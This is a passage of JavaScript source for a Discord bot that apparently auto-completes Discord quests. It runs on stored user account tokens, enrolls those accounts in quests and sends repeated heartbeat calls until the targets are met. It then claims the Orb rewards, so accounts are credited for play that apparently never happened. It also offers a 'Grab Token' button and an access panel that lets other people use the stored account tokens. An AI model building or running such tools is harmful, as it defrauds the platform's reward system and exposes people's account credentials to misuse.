            } else {
                const orbPool = pending.reduce((s, q) => s + getOrbAmt(q), 0);
                for (const q of pending.slice(0, 4)) {
                    const { type, target } = questTarget(q);
                    const cur  = (q.user_status?.progress || {})[type]?.value || 0;
                    const pct  = target ? Math.min(100, Math.floor(cur / target * 100)) : 0;
                    const orbs = getOrbAmt(q);
                    const ico  = orbs > 0 ? ORBS_E : '<:games1:1459863568231956501>';
                    const os   = orbs > 0 ? ` <:giveaways:1459851717368873118> **${orbs}**` : '';
                    const nm   = (q.config?.messages?.quest_name || 'Quest').slice(0, 45);
                    qLines += `> ${ico} **${nm}**${os} — \`${pct}%\`\n`;
                }
                if (pending.length > 4) qLines += `> -# +${pending.length - 4} ${SC('more quests...')}\n`;
                if (orbPool > 0) qLines += `> -# <:giveaways:1459851717368873118> ${SC('total potential:')} **${orbPool} orbs**\n`;
                if (videoPending.length) {
                    const vidOrbPool = videoPending.reduce((s, q) => s + getOrbAmt(q), 0);
                    const vidOrbStr  = vidOrbPool > 0 ? ` <:giveaways:1459851717368873118> **${vidOrbPool}**` : '';
                    qLines += `> 🎬 **${videoPending.length}** ${SC('video quest(s) found')}${vidOrbStr} \`${SC('manual')}\`\n`;
                }
            }
        } else {
            qLines += `> ⚠️ ${SC('could not fetch quests')}\n`;
        }
    } else {
        qLines += `> -# ${SC('add an account to see quests')}\n`;
    }
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(qLines));
    addSep(c);

    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_quests')      .setLabel('View Quests').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1511625467919208558', name: 'Orbs', animated: true }),
        new ButtonBuilder().setCustomId('q_complete')    .setLabel('Complete')   .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498939702915502112', name: 'HB7f', animated: true }),
        new ButtonBuilder().setCustomId('q_accounts')    .setLabel('Manage')     .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1495715447130296361', name: 'users' }),
        new ButtonBuilder().setCustomId('q_refresh_main').setLabel('Refresh')    .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true }),
    ));

    return wrap(c);
}

// ── QUEST STATUS ──────────────────────────────────────────────
function uiQuestStatus(rows, accIdx = -1) {
    const c = mkContainer(CLR.T);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# <:info:1495717180434813001> ${SC('quest status')}`));
    addSep(c);
    for (const row of rows) {
        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(String(row).slice(0, 3900)));
        addSep(c);
    }
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`q_refresh_${accIdx}`).setLabel('Refresh').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true }),
        new ButtonBuilder().setCustomId('q_back')             .setLabel('Back')   .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

// ── ACCOUNT SELECTOR ──────────────────────────────────────────
function uiAccSelector(opts) {
    const c = mkContainer(CLR.P);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# ${ORBS_E} ${SC('select account')}\n-# ${SC('choose which account to complete quests on')}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId('sel_account').setPlaceholder(`${SC('select account')}...`).addOptions(opts)
    ));
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_back').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

// ── QUEST SELECTOR ────────────────────────────────────────────
function uiQuestSelector(questOpts, accMention, accIdx) {
    let orbPool = 0;
    for (const o of questOpts) {
        const m = o.description?.match(/^(\d+) Orbs/);
        if (m) orbPool += parseInt(m[1]);
    }
    const poolStr = orbPool > 0 ? `\n-# <:giveaways:1459851717368873118> ${SC('potential:')} **${orbPool} orbs**` : '';
    const c = mkContainer(CLR.P);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# ${ORBS_E} ${SC('select quest')}\n-# <:owo_yay:1498978297210605608> ${accMention} — ${SC('choose quest to complete')}${poolStr}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId('sel_complete').setPlaceholder(`${SC('choose quest')}...`).addOptions(questOpts)
    ));
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`q_completeall_${accIdx}`).setLabel('Complete All').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498939702915502112', name: 'HB7f', animated: true }),
        new ButtonBuilder().setCustomId('q_back')                 .setLabel('Back')        .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

// ── PROGRESS ──────────────────────────────────────────────────
function uiProgress(lines, done, total, autoActive = false) {
    const c = mkContainer(CLR.Y);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# <:giveaways:1459851717368873118> ${SC('completing quests...')}\n${lines}\n### <a:tickk:1512955302629216468> ${done}/${total} ${SC('done')}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_stop')                  .setLabel('Stop')        .setStyle(ButtonStyle.Danger)    .setEmoji({ id: '1498992013499039855', name: 'Cross' }),
        new ButtonBuilder().setCustomId('q_progress_refresh_once') .setLabel('Refresh')     .setStyle(ButtonStyle.Secondary) .setEmoji({ id: '1498991627140862032', name: 'radar', animated: true }),
        new ButtonBuilder().setCustomId('q_progress_autorefresh')  .setLabel('Auto Refresh').setStyle(ButtonStyle.Secondary) .setEmoji({ id: '1483558170935820420', name: 'User' }).setDisabled(autoActive)
    ));
    return wrap(c);
}

// ── DONE ──────────────────────────────────────────────────────
function uiDone(total, stopped = false, orbTotal = 0) {
    const orbStr = orbTotal > 0 ? `\n<:giveaways:1459851717368873118> **${orbTotal}** ${SC('orbs earned!')}` : '';
    const c = mkContainer(stopped ? CLR.D : CLR.G);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        stopped
            ? `# <:Cross:1498992013499039855> ${SC('stopped')}\n${SC('completed what was possible.')}${orbStr}\n-# ${SC('claim rewards manually in the discord app.')}`
            : `# <a:tickk:1512955302629216468> ${SC('all done!')}\n<:giveaways:1459851717368873118> **${total}** ${SC('quest(s) completed.')}${orbStr}\n-# ${SC('rewards claimed! check discord app to confirm.')}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_back')        .setLabel('Back to Menu').setStyle(ButtonStyle.Primary)  .setEmoji({ id: '1493406616937169039', name: 'arrow_left' }),
        new ButtonBuilder().setCustomId('q_refresh_main').setLabel('Refresh')     .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true })
    ));
    return wrap(c);
}

// ── MANAGE ACCOUNTS ───────────────────────────────────────────
async function uiManage(tokens, activeIdx, isOwner = false, isFull = false) {
    const c     = mkContainer(CLR.D);
    const infos = await Promise.all(tokens.map(t => cachedInfo(t)));
    let list    = '';
    const removeOpts = [];
    const switchOpts = [];

    for (let i = 0; i < tokens.length; i++) {
        const inf   = infos[i];
        const crown = (activeIdx === i) ? ' <a:Crown:1493401405199880312>' : '';
        list += `> \`${i + 1}.\` <@${inf.id}> (\`${inf.name}\`)${crown}\n`;
        if (isOwner && i < 25) removeOpts.push({ label: `[${i + 1}] ${inf.name}`, value: `${i}`, description: 'Tap to remove' });
        if (i < 25)            switchOpts.push({ label: inf.name, value: `${i}`, description: 'Set as active account' });
    }
    if (!list) list = `> *${SC('no accounts yet')}*`;

    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# <:users:1495715447130296361> ${SC('manage accounts')}\n${list}`));
    addSep(c);

    if (tokens.length > 1) {
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder().setCustomId('sel_switch').setPlaceholder(`🔄 ${SC('switch active account')}...`).addOptions(switchOpts)
        ));
    }

    if (isOwner) {
        if (removeOpts.length) {
            c.addActionRowComponents(new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder().setCustomId('sel_remove').setPlaceholder(`${SC('select account to remove')}...`).addOptions(removeOpts)
            ));
        }
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('q_add')     .setLabel('Add Account')   .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1511685617484959767', name: 'add' }),
            new ButtonBuilder().setCustomId('q_grabtok') .setLabel('Grab Token')    .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498939702915502112', name: 'HB7f', animated: true }),
            new ButtonBuilder().setCustomId('q_access')  .setLabel('Access Control').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493401405199880312', name: 'Crown', animated: true }),
            new ButtonBuilder().setCustomId('q_back')    .setLabel('Back')          .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ));
    } else if (isFull) {
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('q_add')     .setLabel('Add Account')   .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1511685617484959767', name: 'add' }),
            new ButtonBuilder().setCustomId('q_grabtok') .setLabel('Grab Token')    .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498939702915502112', name: 'HB7f', animated: true }),
            new ButtonBuilder().setCustomId('q_access')  .setLabel('Access Control').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493401405199880312', name: 'Crown', animated: true }),
            new ButtonBuilder().setCustomId('q_back')    .setLabel('Back')          .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ));
    } else {
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('q_back').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ));
    }
    return wrap(c);
}

// ── SWITCH ACCOUNT ────────────────────────────────────────────
async function uiSwitch(tokens) {
    const n     = Math.min(tokens.length, 25);
    const names = await Promise.all(tokens.slice(0, n).map(t => cachedName(t)));
    const opts  = names.map((nm, i) => ({ label: nm, value: `${i}`, description: 'Set as active account' }));
    const c     = mkContainer(CLR.B);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# 🔄 ${SC('switch active account')}`));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId('sel_switch').setPlaceholder(`${SC('select account')}...`).addOptions(opts)
    ));
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_back').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

// ── ACCESS PANEL ──────────────────────────────────────────────
function uiAccessPanel(uid) {
    const ac       = acLoad();
    const isOwner  = ac.ownerId === String(uid);
    const canCtrl  = isOwner || ac.fullUsers.includes(String(uid));
    const c        = mkContainer(CLR.B);

    const myLvl = acLevel(uid);
    const myBadge =
        myLvl === 'owner' ? `<:crown:1494542237718020207> ${SC('owner')}` :
        myLvl === 'full'  ? `<a:HB7f:1498939702915502112> ${SC('full access')}` :
        myLvl === 'half'  ? `<a:HB6l:1513308976278798357> ${SC('half access')}` :
                            `<:User:1483558170935820420> ${SC('user')}`;

    const fullList = ac.fullUsers.filter(u => u !== ac.ownerId);
    const halfList = ac.halfUsers.filter(u => u !== ac.ownerId);
    const allUsers = [...fullList.map(u => ({ id: u, level: 'full' })), ...halfList.map(u => ({ id: u, level: 'half' }))];

    let txt = `# <:crown:1494542237718020207> ${SC('access control')}\n`;
    txt += `-# ${SC('manage who can use this bot')}\n\n`;
    txt += `-# <:crown:1494542237718020207> **ᴏᴡɴᴇʀ :** ${ac.ownerId ? `<@${ac.ownerId}>` : SC('not set')}\n`;
    txt += `-# <:User:1483558170935820420> **ʏᴏᴜʀ ʀᴏʟᴇ :** ${myBadge}\n\n`;
    txt += `### <:owo_yay:1498978297210605608> ${SC('allowed users')} (${allUsers.length})\n`;

    if (!allUsers.length) {
        txt += `> *${SC('no users added yet')}*\n`;
    } else {
        allUsers.slice(0, 20).forEach((u, i) => {
            const badge = u.level === 'full' ? '<a:HB7f:1498939702915502112>' : '<a:HB6l:1513308976278798357>';
            txt += `> **${i + 1}.** ${badge} <@${u.id}> \`${u.id}\`\n`;
        });
    }

    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(txt));
    addSep(c);

    if (canCtrl) {
        if (allUsers.length) {
            c.addActionRowComponents(new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder().setCustomId('sel_access_remove').setPlaceholder(`➖ ${SC('select user to remove')}...`)
                    .addOptions(allUsers.slice(0, 25).map(u => ({
                        label: `Remove ${u.id}`, value: u.id,
                        description: `${u.level === 'full' ? 'Full' : 'Half'} Access — ${u.id}`,
                        emoji: { id: '1483558170935820420', name: 'User' }
                    })))
            ));
        }
        const btns = [
            new ButtonBuilder().setCustomId('q_access_add_user').setLabel('Add User') .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1511685617484959767', name: 'add' }),
            new ButtonBuilder().setCustomId('q_access_ref')     .setLabel('Refresh')  .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true }),
            new ButtonBuilder().setCustomId('q_accounts')       .setLabel('Back')     .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ];
        if (allUsers.length) {
            btns.splice(1, 0, new ButtonBuilder().setCustomId('q_access_manage').setLabel('Manage Access').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493401405199880312', name: 'Crown', animated: true }));
        }
        c.addActionRowComponents(new ActionRowBuilder().addComponents(...btns));
    } else {
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('q_accounts').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ));
    }
    return wrap(c);
}

// ── MANAGE ACCESS SELECT ──────────────────────────────────────
async function uiAccessManage(uid) {
    const ac       = acLoad();
    const fullList = ac.fullUsers.filter(u => u !== ac.ownerId);
    const halfList = ac.halfUsers.filter(u => u !== ac.ownerId);
    const all      = [...fullList.map(u => ({ id: u, type: 'full' })), ...halfList.map(u => ({ id: u, type: 'half' }))];
    if (!all.length) return null;

    const nameMap = {};
    for (const u of all.slice(0, 25)) {
        try {
            const res = await fetch(`https://discord.com/api/v9/users/${u.id}`, {
                headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }
            });
            if (res.ok) {
                const d = await res.json();
                nameMap[u.id] = { display: d.global_name || d.username || u.id, username: d.username || u.id };
            }
        } catch {}
        if (!nameMap[u.id]) nameMap[u.id] = { display: u.id, username: u.id };
    }

    const c = mkContainer(CLR.B);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# <:crown:1494542237718020207> ${SC('manage access')}\n-# ${SC('select a user to change their access level')}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId('sel_access_pick_user').setPlaceholder(`${SC('select user')}...`)
            .addOptions(all.slice(0, 25).map(u => {
                const nm = nameMap[u.id];
                return {
                    label: nm.display.slice(0, 25),
                    value: u.id,
                    description: `@${nm.username} · ${u.id} · ${u.type === 'full' ? 'Full' : 'Half'} Access`.slice(0, 50),
                    emoji: u.type === 'full'
                        ? { id: '1498939702915502112', name: 'HB7f', animated: true }
                        : { id: '1513308976278798357', name: 'HB6l', animated: true }
                };
            }))
    ));
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('q_access').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

function uiAccessUser(targetId) {
    const ac     = acLoad();
    const isFull = ac.fullUsers.includes(targetId);
    const isHalf = ac.halfUsers.includes(targetId);
    const cur    = isFull ? `<a:HB7f:1498939702915502112> ${SC('full access')}` : isHalf ? `<a:HB6l:1513308976278798357> ${SC('half access')}` : SC('no access');
    const c      = mkContainer(CLR.B);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# <:crown:1494542237718020207> ${SC('manage user')}\n> <@${targetId}> \`${targetId}\`\n-# **${SC('current')}:** ${cur}`
    ));
    addSep(c);
    c.addActionRowComponents(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`q_mau_full_${targetId}`)  .setLabel('Full Access').setStyle(isFull ? ButtonStyle.Primary : ButtonStyle.Secondary).setEmoji({ id: '1498939702915502112', name: 'HB7f', animated: true }).setDisabled(isFull),
        new ButtonBuilder().setCustomId(`q_mau_half_${targetId}`)  .setLabel('Half Access').setStyle(isHalf ? ButtonStyle.Primary : ButtonStyle.Secondary).setEmoji({ id: '1513308976278798357', name: 'HB6l', animated: true }).setDisabled(isHalf),
        new ButtonBuilder().setCustomId(`q_mau_remove_${targetId}`).setLabel('Remove')     .setStyle(ButtonStyle.Danger)                                  .setEmoji({ id: '1498992013499039855', name: 'Cross' }),
        new ButtonBuilder().setCustomId('q_access_manage')         .setLabel('Back')       .setStyle(ButtonStyle.Secondary)                               .setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
    ));
    return wrap(c);
}

// ── QUEST ROW ─────────────────────────────────────────────────
async function buildQuestRow(token, info, qs, idx) {
    if (!qs) return `### <@${info.id}>\n❌ ${SC('failed to fetch')}`;

    const allPlay  = qs.filter(q => questIsPlay(q)  && !questExpired(q));
    const allVideo = qs.filter(q => questIsVideo(q) && !questExpired(q));
    const isDone   = (q) => {
        if (q.user_status?.claimed_at) return true;
        const { type, target } = questTarget(q);
        if (target > 0) { const cur = (q.user_status?.progress || {})[type]?.value || 0; if (cur >= target) return true; }
        return false;
    };

    const active  = allPlay.filter(q =>  (q.user_status || {}).enrolled_at && !(q.user_status || {}).claimed_at && !isDone(q));
    const claimed = allPlay.filter(q =>  isDone(q)).length;
    const waiting = allPlay.filter(q => !(q.user_status || {}).enrolled_at  && !isDone(q));
    const shown   = [...active, ...waiting];
    const orbPool = shown.reduce((s, q) => s + getOrbAmt(q), 0);
    const orbLine = orbPool > 0 ? `  ·  <:giveaways:1459851717368873118> **${orbPool} orbs**` : '';

    let txt = `### <@${info.id}>\n`;
    txt += `> ${ORBS_E} ${SC('active:')} **${active.length}**  ·  <a:restarted:1490948727781724160> ${SC('claimed:')} **${claimed}**  ·  <:x_info:1459852029580284088> ${SC('new:')} **${waiting.length}**${orbLine}\n`;

    if (shown.length) {
        for (const q of shown) {
            const { type, target } = questTarget(q);
            const cur  = (q.user_status?.progress || {})[type]?.value || 0;
            const pct  = target ? Math.min(100, Math.floor(cur / target * 100)) : 0;
            const orbs = getOrbAmt(q);
            const tag  = (q.user_status || {}).enrolled_at ? (orbs > 0 ? ORBS_E : '<:games1:1459863568231956501>') : '<a:tickk:1512955302629216468>';
            const os   = orbs > 0 ? `  — <:giveaways:1459851717368873118> **${orbs}**` : '';
            txt += `\n${tag} **${(q.config?.messages?.quest_name || 'Quest').slice(0, 50)}**${os}\n> \`${progressBar(pct)}\` **${pct}%**  (${cur}/${target})\n`;
        }
    } else {
        txt += `\n<:Welcomer:1459852564634931381> ${SC('all claimed!')}`;
    }

    // Video quests display only
    if (allVideo.length) {
        const vidPending = allVideo.filter(q => !isDone(q));
        const vidClaimed = allVideo.length - vidPending.length;
        const vidOrbPool = vidPending.reduce((s, q) => s + getOrbAmt(q), 0);
        const vidOrbLine = vidOrbPool > 0 ? `  ·  <:giveaways:1459851717368873118> **${vidOrbPool} orbs**` : '';

        txt += `\n\n### 🎬 ${SC('video quests')}\n`;
        txt += `> <:x_info:1459852029580284088> ${SC('pending:')} **${vidPending.length}**  ·  <a:restarted:1490948727781724160> ${SC('claimed:')} **${vidClaimed}**${vidOrbLine}\n`;
        txt += `> -# ${SC('watch these manually in the discord app — bot does not auto-complete video quests.')}\n`;

        if (vidPending.length) {
            for (const q of vidPending) {
                const { type, target } = questTarget(q);
                const cur  = (q.user_status?.progress || {})[type]?.value || 0;
                const pct  = target ? Math.min(100, Math.floor(cur / target * 100)) : 0;
                const orbs = getOrbAmt(q);
                const os   = orbs > 0 ? `  — <:giveaways:1459851717368873118> **${orbs}**` : '';
                txt += `\n🎬 **${(q.config?.messages?.quest_name || 'Quest').slice(0, 50)}**${os}\n> \`${progressBar(pct)}\` **${pct}%**  (${cur}/${target})\n`;
            }
        } else {
            txt += `\n<:Welcomer:1459852564634931381> ${SC('all claimed!')}`;
        }
    }

    return txt;
}

function buildQuestOpts(active, accName, accIdx) {
    const opts = [];
    for (const q of active) {
        if (opts.length >= 25) break;
        if (q.user_status?.claimed_at) continue;
        const { type, target } = questTarget(q);
        const cur  = (q.user_status?.progress || {})[type]?.value || 0;
        const pct  = target ? Math.floor(cur / target * 100) : 0;
        if (pct >= 100) continue;
        const qnm  = (q.config?.messages?.quest_name || 'Quest').slice(0, 90);
        const orbs = getOrbAmt(q);
        const desc = orbs > 0 ? `${orbs} Orbs · ${pct}% done` : `${pct}% done`;
        const opt  = { label: qnm, value: `q_${accIdx}_${q.id}`, description: desc };
        if (orbs > 0) opt.emoji = { id: '1511625467919208558', name: 'Orbs', animated: true };
        opts.push(opt);
    }
    return opts;
}

// ═══════════════════════════════════════════════════════════════
// QUEST RUNNER
// ═══════════════════════════════════════════════════════════════
async function runQuests(int, uid, tokens, value) {
    let targets = [];

    function shouldRun(q) {
        if (!questIsPlay(q) || q.user_status?.claimed_at || questExpired(q)) return false;
        const { type, target } = questTarget(q);
        if (target > 0) {
            const cur = (q.user_status?.progress || {})[type]?.value || 0;
            if (cur >= target) return false;
        }
        return true;
    }

    if (value === 'all_all') {
        const allQuests = await Promise.all(tokens.map(t => fetchQuests(t).catch(() => null)));
        for (let i = 0; i < allQuests.length; i++) {
            const qs = allQuests[i]; if (!qs) continue;
            for (const q of qs) if (shouldRun(q)) targets.push({ tkn: tokens[i], qid: q.id, q });
        }
    } else if (value.startsWith('all_acc_')) {
        const t = tokens[parseInt(value.split('_')[2])]; if (!t) return int.editReply(uiInfo(CLR.R, '❌ Invalid.'));
        const qs = await fetchQuests(t); if (qs) for (const q of qs) if (shouldRun(q)) targets.push({ tkn: t, qid: q.id, q });
    } else if (value.startsWith('q_')) {
        const parts = value.split('_'); const ai = parseInt(parts[1]); const qid = parts.slice(2).join('_');
        const t = tokens[ai]; if (!t) return int.editReply(uiInfo(CLR.R, '❌ Invalid.'));
        const qs = await fetchQuests(t);
        const q  = qs?.find(x => x.id === qid);
        if (q) targets.push({ tkn: t, qid, q });
    }

    if (!targets.length) return int.editReply(uiInfo(CLR.Y, `⭕ ${SC('no quests to complete! may already be done or expired.')}`));

    const total    = targets.length;
    const mySession = (runtime.sessions.get(uid) || 0) + 1;
    runtime.sessions.set(uid, mySession);
    runtime.stopFlags.set(uid, false);

    const uniqTokens = [...new Set(targets.map(t => t.tkn))];
    const nameMap    = {};
    for (const tkn of uniqTokens) { const inf = await cachedInfo(tkn); nameMap[tkn] = { name: inf.name, id: inf.id }; }

    const states = targets.map(t => {
        const { type, target } = questTarget(t.q);
        const cur   = (t.q.user_status?.progress || {})[type]?.value || 0;
        const pct   = target ? Math.floor(cur / target * 100) : 0;
        const done  = !!(t.q.user_status?.claimed_at) || (target > 0 && cur >= target);
        return {
            tkn: t.tkn, qid: t.qid,
            name:       (t.q.config?.messages?.quest_name || 'Quest').slice(0, 45),
            type, target,
            cur:        done ? target : cur,
            orbAmt:     getOrbAmt(t.q),
            done,
            staleCount: 0,
            lastCur:    -1
        };
    });

    const initialDone = states.filter(s => s.done).length;

    function buildLines() {
        let out = '', prev = '', doneOrbs = 0;
        for (const st of states.filter(s => !s.done)) {
            if (st.tkn !== prev) { out += `\n<:owo_yay:1498978297210605608> **Account :** <@${nameMap[st.tkn].id}> (\`${nameMap[st.tkn].name}\`)\n`; prev = st.tkn; }
            const pct  = st.target ? Math.floor(Math.min(st.cur, st.target) / st.target * 100) : 0;
            const ico  = st.orbAmt > 0 ? ORBS_E : '<:games1:1459863568231956501>';
            const os   = st.orbAmt > 0 ? ` — <:giveaways:1459851717368873118> **${st.orbAmt}**` : '';
            out += `${ico} **${st.name}**${os}\n> \`${progressBar(pct)}\` **${pct}%**\n`;
        }
        const doneList = states.filter(s => s.done);
        if (doneList.length) {
            out += '\n';
            for (const st of doneList) {
                const os = st.orbAmt > 0 ? ` — <:giveaways:1459851717368873118> **${st.orbAmt}**` : '';
                out += `<a:tickk:1512955302629216468> ~~**${st.name}**~~${os}\n`;
                doneOrbs += st.orbAmt;
            }
        }
        if (doneOrbs > 0) out += `\n<:giveaways:1459851717368873118> ${SC('earned so far:')} **${doneOrbs} orbs**\n`;
        return out;
    }

    runtime.activeRuns.set(uid, { states, names: nameMap, total, buildLines, sessionId: mySession });
    await int.editReply(uiProgress(buildLines(), initialDone, total));

    // Enroll in background
    for (const tkn of uniqTokens) {
        const qs = await fetchQuests(tkn); if (!qs) continue;
        for (const q of qs.filter(q => questIsPlay(q) && !(q.user_status || {}).enrolled_at && !questExpired(q))) await questEnroll(tkn, q.id);
    }

    let allDone = false;
    while (!allDone) {
        if (runtime.sessions.get(uid) !== mySession) return;

        if (runtime.stopFlags.get(uid)) {
            runtime.stopFlags.set(uid, false);
            runtime.activeRuns.delete(uid);
            const dc      = states.filter(s => s.done).length;
            const orbDone = states.filter(s => s.done).reduce((s, x) => s + x.orbAmt, 0);
            int.editReply(uiDone(dc, true, orbDone)).catch(() => {});
            Promise.all(states.filter(s => s.done).map(st => questClaim(st.tkn, st.qid)))
                .then(async () => {
                    for (const tkn of [...new Set(states.filter(s => s.done).map(s => s.tkn))]) {
                        cache.quest.delete(tkn);
                        const qs = await fetchQuests(tkn); if (qs) vaultSync(qs);
                    }
                }).catch(() => {});
            return;
        }

        allDone = true;
        await Promise.all(states.map(async (st) => {
            if (st.done) return;
            if (st.target > 0 && st.cur >= st.target) { st.done = true; return; }

            const prevCur = st.cur;
            const { s, d } = await questHeartbeat(st.tkn, st.qid);
            if (s === 200 && d?.progress) {
                const p = d.progress[st.type];
                if (p) {
                    st.cur = p.value ?? st.cur;
                    if (p.completed_at || st.cur >= st.target) { st.cur = st.target; st.done = true; return; }
                }
            }

            const pct = st.target ? Math.floor(st.cur / st.target * 100) : 0;

            if (pct >= 99) {
                cache.quest.delete(st.tkn);
                const verifyQs = await fetchQuests(st.tkn);
                const verifyQ  = verifyQs?.find(q => q.id === st.qid);
                if (verifyQ) {
                    const { type: vt, target: vTgt } = questTarget(verifyQ);
                    const vCur = (verifyQ.user_status?.progress || {})[vt]?.value || 0;
                    const vPct = vTgt ? Math.floor(vCur / vTgt * 100) : 0;
                    if (verifyQ.user_status?.claimed_at || vCur >= vTgt || vPct >= 100) {
                        st.cur = vTgt; st.done = true; return;
                    }
                    st.cur = vCur;
                    st.staleCount = 0;
                    if (!st.done) allDone = false;
                    return;
                } else {
                    st.cur = st.target; st.done = true; return;
                }
            }

            if (st.cur === prevCur) {
                st.staleCount = (st.staleCount || 0) + 1;
                if (st.staleCount >= 3) {
                    cache.quest.delete(st.tkn);
                    const freshQs = await fetchQuests(st.tkn);
                    const freshQ  = freshQs?.find(q => q.id === st.qid);
                    if (freshQ) {
                        const { type: ft, target: fTgt } = questTarget(freshQ);
                        const fCur = (freshQ.user_status?.progress || {})[ft]?.value || 0;
                        const fPct = fTgt ? Math.floor(fCur / fTgt * 100) : 0;
                        if (freshQ.user_status?.claimed_at || fCur >= fTgt || fPct >= 100) { st.cur = fTgt; st.done = true; return; }
                        st.cur = fCur;
                    } else { st.done = true; return; }
                    st.staleCount = 0;
                }
            } else {
                st.staleCount = 0;
            }

            if (!st.done) allDone = false;
        }));

        if (!allDone) await delay(4000);
        if (runtime.sessions.get(uid) !== mySession) return;
    }

    runtime.activeRuns.delete(uid);
    try { await int.editReply(uiProgress(buildLines(), states.length, total)); } catch {}
    await Promise.all(states.map(st => questClaim(st.tkn, st.qid)));

    const uniqTokens2 = [...new Set(states.map(s => s.tkn))];
    for (const tkn of uniqTokens2) {
        cache.quest.delete(tkn);
        const qs = await fetchQuests(tkn); if (qs) vaultSync(qs);
    }
    const orbAll = states.reduce((s, x) => s + x.orbAmt, 0);
    return int.editReply(uiDone(total, false, orbAll)).catch(() => {});
}

// ═══════════════════════════════════════════════════════════════
// SLASH COMMAND SELF-REGISTRATION
// ═══════════════════════════════════════════════════════════════
async function registerCommands(botToken, clientId) {
    const rest = new REST({ version: '10' }).setToken(botToken);

    const commands = [
        new SlashCommandBuilder()
            .setName('autoquest')
            .setDescription('Open Quest Auto-Completer')
            .setIntegrationTypes(ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall)
            .setContexts(InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel)
            .toJSON(),
        new SlashCommandBuilder()
            .setName('invite')
            .setDescription('Get bot invite link for user install')
            .setIntegrationTypes(ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall)
            .setContexts(InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel)
            .toJSON()
    ];

    try {
        tLog('cmd', 'Registering slash commands...');
